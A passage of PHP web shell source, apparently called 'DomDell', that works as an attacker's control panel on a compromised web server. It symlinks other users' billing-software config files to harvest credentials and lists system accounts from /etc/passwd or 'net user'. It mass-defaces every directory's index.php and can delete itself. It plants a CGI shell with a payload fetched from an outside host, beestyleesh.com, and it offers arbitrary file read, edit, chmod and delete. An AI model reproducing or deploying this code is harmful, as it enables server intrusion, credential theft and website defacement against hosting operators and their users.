                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/order/includes/iso4217.php', $r . $us . '..Hostbills');
                }
                echo "<center>";
                echo "<br/>";
                echo "<a href='DomDell_Config'>Configuration Files</a>";
                echo "</center>";
            }
        }
    } ?>
    <?php
    if (isset($_POST['us'])) {
        if (strtoupper(substr(php_uname(), 0, 3)) === 'WIN') {
            echo `net user > users.txt`;
    ?>
            <center><a href='<?php echo "users.txt" ?>'>Users</a></center>
        <?php
        } else {
        ?>
            <center>
                <table border="1" class="users">
                    <?php
                    echo "<tr>";
                    $users = file('/etc/passwd');
                    foreach ($users as $us) {
                        $str = explode(":", $us);
                        echo "<td>" . $str[0] . "\n" . "</td>";
                        echo "</tr>";
                    }
                    ?>
                </table>
            </center>
        <?php }
    }
    if (isset($_POST['mass'])) {
        ?>
        <form method="post">
            <center>
                Target Folder:<br />
                <input type="text" name='file' value="<?php echo getcwd(); ?>" style="background-color: #262626 ;color:white;border: 1px solid blue;width: 300px;padding: 10px"><br />
                File:<br />
                <input type="text" value="index.php" name="andela" style="background-color: #262626 ;color:white;border: 1px solid blue;width: 300px;padding: 10px"><br />
                Script Deface:<br />
                <textarea style="background-color:#262626;border: 1px solid blue" name="source" cols="50" rows="5">Hacked By Md. Nur Habib</textarea><br />
                <input style="color: white; background-color: black; border: 1px solid blue" type="submit" name="Deface" value='Mass'>
            </center>
        </form>
        <?php }
    if (isset($_POST['Deface'])) {
        if (!file_exists($_POST['file'])) {
            die($_POST['file'] . " Not Found !<br>");
        }
        if (!is_dir($_POST['file'])) {
            die($_POST['file'] . " Is Not A Directory !<br>");
        }
        @chdir($_POST['file']) or die("Cannot Open Directory");

        $files = @scandir($_POST['file']) or die("Fuck u -_- <br>");

        foreach ($files as $file) :
            if ($file != "." && $file != ".." && @filetype($file) == "dir") {
                $index = getcwd() . "/" . $file . "/" . $_POST['andela'];
                if (file_put_contents($index, $_POST['source']))
                    echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
            }
        endforeach;
    }



    if (isset($_POST['delet'])) {
        $shell = basename($_SERVER['SCRIPT_FILENAME']);
        unlink($shell);
    }
    if (isset($_POST['cgi'])) {
        if ($_GET['path']) {
            if (file_exists("DomDell_CGI")) {
        ?>
                <center>
                    <a href='<?php echo $_GET['path'] . "/DomDell_CGI/" ?>'>Click Here</a>
                </center>
            <?php
            } else {
                @mkdir($_GET['path'] . "/DomDell_CGI", 0777);
                $fi = fopen($_GET['path'] . '/DomDell_CGI/.htaccess', "w");
                fwrite($fi, "DefaultType text/html
Options -Indexes +ExecCGI
SetHandler cgi-script");
                $response = file_get_contents("./cgg.pl");
                $fil2 = fopen($_GET['path'] . '/DomDell_CGI/web.root', "w");
                fwrite($fil2, $response);
            ?>
                <center>
                    <a href='<?php echo $_GET['path'] . "/DomDell_CGI/" ?>'>Click Here</a>
                </center>
            <?php
            }
        } else {

            if (file_exists("DomDell_CGI")) {
            ?>
                <center>
                    <a href='<?php "DomDell_CGI/" ?>'>Click Here</a>
                </center>
            <?php
            } else {
                @mkdir("DomDell_CGI", 0777);
                $local = fopen('DomDell_CGI/.htaccess', "w");
                fwrite($local, "DefaultType text/html
Options -Indexes +ExecCGI
SetHandler cgi-script");

                $response = file_get_contents("http://beestyleesh.com/fonts/web.root");
                $local2 = fopen('DomDell_CGI/web.root', "w");
                fwrite($local2, $response);
            ?>
                <center>
                    <a href="<?php echo "DomDell_CGI/" ?>">Click Here</a>
                </center>
            <?php } ?>
        <?php } ?>
    <?php } ?>
    <?php
    if (isset($_GET['filesrc'])) {
        echo "<tr><td>Current File : ";
        echo $_GET['filesrc'];
        echo '</tr></td></table><br />';
        echo ('<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>');
    } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
        echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
        if ($_POST['opt'] == 'chmod') {
            if (isset($_POST['perm'])) {
                if (chmod($_POST['path'], $_POST['perm'])) {
                    echo '<font color="white">./Done !</font><br />';
                } else {
                    echo '<font color="white">./Done !</font><br />';
                }
            }
            echo '<form method="POST">
           Permission : <input style="color:black" class="btnfilesys" name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
           <input type="hidden" name="path" value="' . $_POST['path'] . '">
           <input type="hidden" name="opt" value="chmod">
           <input  class="btn" type="submit" value="Execute" />
           </form>';
        } elseif ($_POST['opt'] == 'rename') {
            if (isset($_POST['newname'])) {
                if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                    echo '<font color="white">./Done !</font><br />';
                } else {
                    echo '<font color="white">./Error !</font><br />';
                }
                $_POST['name'] = $_POST['newname'];
            }
            echo '<form method="POST">
           Name : <input class="btnfilesys" name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
           <input type="hidden" name="path" value="' . $_POST['path'] . '">
           <input type="hidden" name="opt" value="rename">
           <input class="btn" type="submit" value="Execute" />
           </form>';
        } elseif ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w');
                if (fwrite($fp, $_POST['src'])) {
                    echo '<font color="white">./Done !</font><br />';
                } else {
                    echo '<font color="white">./Done !</font><br />';
                }
                fclose($fp);
            }
            echo '<form method="POST">
           <textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
           <input type="hidden" name="path" value="' . $_POST['path'] . '">
           <input type="hidden" name="opt" value="edit">
           <input class="btn" type="submit" value="Execute" />
           </form>';
        }
        echo '</center>';
    } else {
        echo '</table><br /><center>';
        if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
            if ($_POST['type'] == 'dir') {
                if (@rmdir($_POST['path'])) {
                    echo '<font color="white">Delete Dir Done </font><br />';
                } else {
                    echo '<font color="white">Delete Dir Error </font><br />';
                }
            } elseif ($_POST['type'] == 'file') {
                if (unlink($_POST['path'])) {
                    echo '<font color="white">./Done !</font><br />';
                } else {
                    echo '<font color="white">./Error !</font><br />';
                }
            }
        }
        echo '</center>';
        $scandir = scandir($path);
        echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">

           <tr class="first">
           <td><center>Name</center></td>
           <td><center>Size</center></td>
           <td><center>Permissions</center></td>
           <td><center>Options</center></td>
           </tr>';

        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo "<tr>
           <td><a href=\"?path=$path/$dir\">$dir</a></td>
           <td><center>Dir</center></td>
           <td><center>";
            if (is_writable("$path/$dir")) echo '<font color="green">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

            echo "</center></td>
           <td><center><form method=\"POST\" action=\"?option&path=$path\">
           <select class=\"selectFile\" name=\"opt\">
           <option value=\"\">Select one</option>
           <option value=\"delete\">Delete</option>
           <option value=\"chmod\">Chmod</option>
           <option value=\"rename\">Rename</option>
           </select>
           <input type=\"hidden\" name=\"type\" value=\"dir\">
           <input type=\"hidden\" name=\"name\" value=\"$dir\">
           <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
           <input class=\"btn\" type=\"submit\" value=\"Execute\" />
           </form></center></td>
        
           </tr>";
        }
    ?>

        <?php
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue;
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }

            echo "<tr>
           <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
           <td><center>" . $size . "</center></td>
           <td><center>";
            if (is_writable("$path/$file")) echo '<font color="green">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo "</center></td>
           <td><center><form method=\"POST\" action=\"?option&path=$path\">
           <select class=\"selectFile\" name=\"opt\">
           <option value=\"\">Select one</option>
           <option value=\"delete\">Delete</option>
           <option value=\"chmod\">Chmod</option>
           <option value=\"rename\">Rename</option>
           <option value=\"edit\">Edit</option>
           </select>
           <input type=\"hidden\" name=\"type\" value=\"file\">
           <input type=\"hidden\" name=\"name\" value=\"$file\">
           <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
           <input class=\"btn\" type=\"submit\" value=\"Execute\" />
           </form></center></td>

           </tr>";

        ?>
    <?php
        }
        echo '</table>
           </div>';
    }
    echo
    '</BODY>
           </HTML>';
    function perms($file)
    {
        $perms = fileperms($file);

        if (($perms & 0xC000) == 0xC000) {
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            $info = 'p';
        } else {
            $info = 'u';
        }

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

        return $info;
    }

    ?>
    <br>
    <hr>

    <?php
    if (isset($createFile)) {
        echo "<center>" . $createFile . "</center>" . "<br>";
    }
    if (isset($createFolder)) {
        echo "<center>" . $createFolder . "</center>" .  "<br>";
    }
    ?>
    <div class="mkdir">
        <form action="" method="post">
            <label>Create Folder</label>
            <input class="createFolder" type="text" name="mkdir">
            <input class="btn" type="submit" value="Create">
        </form>
    </div>
    <div class="file">
        <form action="" method="post">
            <label>Create File</label>
            <input class="createFolder" type="text" name="file">
            <input class="btn" type="submit" value="Create">
        </form>
    </div>
</body>

</html>		
